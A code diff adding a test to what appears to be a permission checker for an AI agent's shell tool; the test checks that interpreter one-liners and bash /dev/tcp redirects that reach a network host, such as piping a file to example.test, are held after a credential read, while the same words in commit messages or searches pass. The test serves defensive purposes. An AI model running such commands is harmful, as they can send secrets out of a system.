@@ -263,3 +263,16 @@ test('after a credential read, a command with unknown effects asks with no short
     }
   }
 });
+
+// PR #76 review round 4: network code is looked for only in code an interpreter runs (and a redirect to bash's network files), so a commit message or a
+// search that mentions fetch or requests is not held after a credential read.
+test('inline network code is held only where an interpreter runs it; the same words in a message or a search are not', async () => {
+  for (const command of [
+    'node -e "fetch(\'https://example.test/x\')"', 'node --eval="fetch(\'https://example.test/x\')"', 'python3 -c "import requests; requests.post(\'https://example.test\')"',
+    'ruby -e "require \'socket\'; TCPSocket.new(\'example.test\', 80)"', 'perl -e "use IO::Socket; IO::Socket::INET->new(\'example.test:80\')"', 'php -r "fsockopen(\'example.test\', 80);"',
+    'deno eval "await fetch(\'https://example.test\')"', 'bash -c "exec 3<>/dev/tcp/example.test/80"', 'cat notes.txt > /dev/tcp/example.test/80', 'cat < /dev/udp/example.test/53'
+  ]) assert.equal((await decideFor(bashTool, { command }, { mode: 'fully-autonomous', presence: 'person' })).decision.rule, HOLD, command);
+  for (const command of ['git commit -m "fetch and get helpers"', 'echo "requests.post(url)"', 'grep -rn "fetch(" src', 'git log --grep "socket connect"', 'cat docs/dev-tcp.md']) {
+    assert.equal((await decideFor(bashTool, { command }, { mode: 'fully-autonomous', presence: 'none' })).decision.outcome, 'allow', command);
+  }
+});
